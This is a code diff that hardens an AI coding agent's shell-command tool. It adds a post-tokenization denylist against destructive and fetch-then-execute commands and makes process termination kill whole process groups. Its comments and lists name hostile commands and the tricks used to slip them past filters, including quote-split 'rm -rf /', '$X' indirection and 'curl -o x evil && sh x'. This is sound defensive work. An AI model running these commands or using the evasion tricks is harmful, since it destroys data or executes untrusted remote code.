@@ -6,7 +6,7 @@ import os
 import re
 import shlex
 import shutil
-import signal as _signal
+import signal
 from pathlib import Path
 from typing import Any, Dict, List, Optional
 
@@ -14,6 +14,7 @@ from pydantic import BaseModel, Field
 
 from coderAI.core.services import get_services
 from coderAI.core.tool_error_codes import ToolErrorCode
+from coderAI.system.proc import kill_process_group, new_session_kwargs
 from coderAI.tools.base import Tool
 
 logger = logging.getLogger(__name__)
@@ -77,6 +78,151 @@ _BLOCKED_REGEXES = _build_blocked_regexes(BLOCKED_PATTERNS)
 # Patterns that indicate piping a network fetch straight into a shell.
 # Matched against a whitespace-normalised lowercase command.
 _PIPE_TO_SHELL_RE = re.compile(r"\b(curl|wget)\b[^|]*\|\s*(sh|bash|zsh|fish|python[23]?|node)\b")
+
+# ── Post-tokenization argv blocklist (Phase 1.1) ─────────────────────────────
+#
+# The string-regex checks above match the *raw* command, but the shell (or
+# ``shlex.split`` on the exec path) re-tokenizes before anything runs. That
+# gap lets ``r""m -rf /``, ``rm -r""f /``, ``X=rm; $X -rf /`` and ``$IFS``
+# tricks slip past a raw-string denylist and then execute the real command.
+# ``_argv_is_blocked`` re-derives the *effective* argv the way the shell will,
+# and matches the denylist against each pipeline segment's ``argv[0]``.
+
+# Binaries that are catastrophic regardless of their arguments.
+_BLOCKED_BINARIES = frozenset({"mkfs", "shutdown", "reboot", "halt", "poweroff", "init"})
+
+# Bare targets that turn a recursive/forced ``rm`` into a wipe of root, home,
+# or the whole working directory. The pre-existing regex only caught ``/``/``~``.
+_DESTRUCTIVE_RM_TARGETS = frozenset(
+    {"/", "~", "~/", "/*", ".", "./", "*", "..", "../"}
+)
+
+# Shells / interpreters that can execute a just-downloaded script file. Used to
+# catch the split fetch-then-exec form (``curl -o x evil && sh x``).
+_SHELL_AND_INTERP = frozenset(
+    {
+        "sh", "bash", "zsh", "fish", "dash", "ksh", "csh", "tcsh",
+        "python", "python2", "python3", "node", "bun", "deno",
+        "perl", "ruby", "php", "lua",
+    }
+)
+
+
+def _tokenize_pipeline_segments(command: str) -> Optional[List[List[str]]]:
+    """Split *command* into per-command argv lists, respecting quotes.
+
+    Returns ``None`` when the command cannot be parsed (e.g. unbalanced
+    quotes) — the caller treats *unparseable* as *block-by-default*.
+    """
+    lex = shlex.shlex(command, posix=True, punctuation_chars=True)
+    lex.whitespace_split = True
+    try:
+        tokens = list(lex)
+    except ValueError:
+        return None
+
+    separators = {";", "|", "||", "&", "&&", "|&", "\n"}
+    segments: List[List[str]] = []
+    current: List[str] = []
+    for tok in tokens:
+        if tok in separators:
+            if current:
+                segments.append(current)
+                current = []
+        else:
+            current.append(tok)
+    if current:
+        segments.append(current)
+    return segments
+
+
+def _is_destructive_rm(argv: List[str]) -> bool:
+    """True if *argv* is an ``rm`` that would wipe root/home/cwd."""
+    base = os.path.basename(argv[0]).lower()
+    if base != "rm":
+        return False
+    has_recursive_force = False
+    targets: List[str] = []
+    for arg in argv[1:]:
+        al = arg.lower()
+        if al in ("--recursive", "--force", "--no-preserve-root"):
+            has_recursive_force = True
+        elif arg.startswith("-") and not arg.startswith("--"):
+            if "r" in al[1:] or "f" in al[1:]:
+                has_recursive_force = True
+        elif not arg.startswith("-"):
+            targets.append(arg)
+    if not has_recursive_force:
+        return False
+    return any(t in _DESTRUCTIVE_RM_TARGETS for t in targets)
+
+
+def _argv0_blocked_binary(argv: List[str]) -> bool:
+    """True if the command name is an always-blocked binary."""
+    base = os.path.basename(argv[0]).lower()
+    if base in _BLOCKED_BINARIES or base.startswith("mkfs."):
+        return True
+    if base == "dd":
+        for arg in argv[1:]:
+            al = arg.lower()
+            if al.startswith("if=/") or al.startswith("of=/dev") or al.startswith("of=/"):
+                return True
+    return False
+
+
+def _fetched_output_files(argv: List[str]) -> "set[str]":
+    """Basenames of files a ``curl``/``wget`` argv writes to disk."""
+    base = os.path.basename(argv[0]).lower()
+    if base not in ("curl", "wget"):
+        return set()
+    files: "set[str]" = set()
+    for i, arg in enumerate(argv):
+        if arg in ("-o", "--output", "--output-document", "-O") and i + 1 < len(argv):
+            files.add(os.path.basename(argv[i + 1]))
+        elif arg.startswith("-o") and len(arg) > 2:
+            files.add(os.path.basename(arg[2:]))
+        elif arg.startswith("--output="):
+            files.add(os.path.basename(arg.split("=", 1)[1]))
+        elif arg.startswith("--output-document="):
+            files.add(os.path.basename(arg.split("=", 1)[1]))
+    return files
+
+
+def _is_split_fetch_exec(segments: List[List[str]]) -> bool:
+    """Catch ``curl -o /tmp/x evil && sh /tmp/x`` split across segments."""
+    fetched: "set[str]" = set()
+    for argv in segments:
+        if argv:
+            fetched |= _fetched_output_files(argv)
+    if not fetched:
+        return False
+    for argv in segments:
+        if not argv:
+            continue
+        if os.path.basename(argv[0]).lower() in _SHELL_AND_INTERP:
+            if any(os.path.basename(a) in fetched for a in argv[1:]):
+                return True
+    return False
+
+
+def _argv_is_blocked(command: str) -> bool:
+    """Evaluate the denylist against the *effective* argv the shell will run."""
+    segments = _tokenize_pipeline_segments(command)
+    if segments is None:
+        # Unparseable (unbalanced quotes / hostile quoting) → fail closed.
+        return True
+    for argv in segments:
+        if not argv:
+            continue
+        # A command *name* built from a variable or substitution
+        # (``$X``, ``${IFS}...``, ``$(...)``, backticks) can hide anything.
+        if "$" in argv[0] or "`" in argv[0]:
+            return True
+        if _argv0_blocked_binary(argv):
+            return True
+        if _is_destructive_rm(argv):
+            return True
+    return _is_split_fetch_exec(segments)
 
 # Commands that require user confirmation
 DANGEROUS_PREFIXES = [
@@ -158,6 +304,13 @@ def is_command_blocked(command: str) -> bool:
         return True
 
     if _PIPE_TO_SHELL_RE.search(cmd_lower):
+        return True
+
+    # Re-derive and check the effective argv (catches quote-splitting,
+    # ``$VAR`` / ``$(...)`` command-name indirection, bare-cwd ``rm``, and the
+    # split fetch-then-exec form). Runs against the raw command so basenames
+    # survive case tricks; comparisons lowercase internally.
+    if _argv_is_blocked(command):
         return True
 
     # Check inner command for shell wrappers
@@ -345,6 +498,7 @@ class RunCommandTool(Tool):
                     stdout=asyncio.subprocess.PIPE,
                     stderr=asyncio.subprocess.PIPE,
                     cwd=working_dir,
+                    **new_session_kwargs(),
                 )
             else:
                 try:
@@ -355,6 +509,7 @@ class RunCommandTool(Tool):
                         stdout=asyncio.subprocess.PIPE,
                         stderr=asyncio.subprocess.PIPE,
                         cwd=working_dir,
+                        **new_session_kwargs(),
                     )
                 except ValueError:
                     return {
@@ -378,11 +533,15 @@ class RunCommandTool(Tool):
                     await process.wait()
             except asyncio.TimeoutError:
                 try:
-                    process.terminate()
+                    # SIGTERM the whole group, not just the leader: terminating
+                    # only the shell reaps it before its backgrounded
+                    # grandchildren (``bash -c 'sleep 1000 & wait'``), orphaning
+                    # them. Escalate to a group SIGKILL if it doesn't die.
+                    kill_process_group(process, signal.SIGTERM)
                     try:
                         await asyncio.wait_for(process.wait(), timeout=2)
                     except asyncio.TimeoutError:
-                        process.kill()
+                        kill_process_group(process)
                         await process.wait()
                 except ProcessLookupError:
                     pass
@@ -405,15 +564,12 @@ class RunCommandTool(Tool):
                     "returncode": process.returncode,
                 }
             except asyncio.CancelledError:
-                # Escalate terminate → kill; cleanup must not mask the cancellation.
+                # Group SIGTERM → group SIGKILL; cleanup must not mask the cancellation.
                 try:
-                    process.terminate()
+                    kill_process_group(process, signal.SIGTERM)
                     await asyncio.wait_for(process.wait(), timeout=1)
                 except Exception:
-                    try:
-                        process.kill()
-                    except Exception:
-                        logger.debug("Failed to kill process after CancelledError", exc_info=True)
+                    kill_process_group(process)
                 raise
 
             # Truncate very large output to prevent context overflow
@@ -554,6 +710,7 @@ class RunBackgroundTool(Tool):
                     stdout=stdout_target,
                     stderr=stderr_target,
                     cwd=working_dir,
+                    **new_session_kwargs(),
                 )
             else:
                 try:
@@ -563,6 +720,7 @@ class RunBackgroundTool(Tool):
                         stdout=stdout_target,
                         stderr=stderr_target,
                         cwd=working_dir,
+                        **new_session_kwargs(),
                     )
                 except ValueError:
                     return {
@@ -626,7 +784,7 @@ class RunBackgroundTool(Tool):
         for pid, info in dict(self._processes).items():
             if info.process.returncode is None:
                 try:
-                    info.process.kill()
+                    kill_process_group(info.process)
                     terminated += 1
                 except Exception:
                     logger.debug(
@@ -641,7 +799,7 @@ def _cleanup_all_background():
     for pid, info in dict(_tracked_bg_processes).items():
         if info.process.returncode is None:
             try:
-                info.process.kill()
+                kill_process_group(info.process)
             except Exception:
                 logger.debug(
                     "Failed to kill background process during atexit cleanup", exc_info=True
@@ -744,12 +902,17 @@ class KillProcessTool(Tool):
                     "error": f"Process {pid} has already exited (returncode={info.process.returncode}).",
                 }
 
-            sig = _signal.SIGKILL if force else _signal.SIGTERM
-            info.process.send_signal(sig)
+            # Signal the whole process group, not just the leader — background
+            # jobs are spawned with their own group (``new_session_kwargs``), so
+            # a backgrounded grandchild (``bash -c 'sleep 1000 & wait'``) would
+            # otherwise be orphaned. ``kill_process_group`` falls back to a
+            # direct kill on Windows / when the group can't be resolved, so this
+            # stays cross-platform (SIGKILL is POSIX-only; the helper maps it).
+            kill_process_group(info.process, signal.SIGKILL if force else signal.SIGTERM)
             try:
                 await asyncio.wait_for(info.process.wait(), timeout=3)
             except asyncio.TimeoutError:
-                info.process.kill()
+                kill_process_group(info.process, signal.SIGKILL)
                 await info.process.wait()
             del _tracked_bg_processes[pid]
             return {
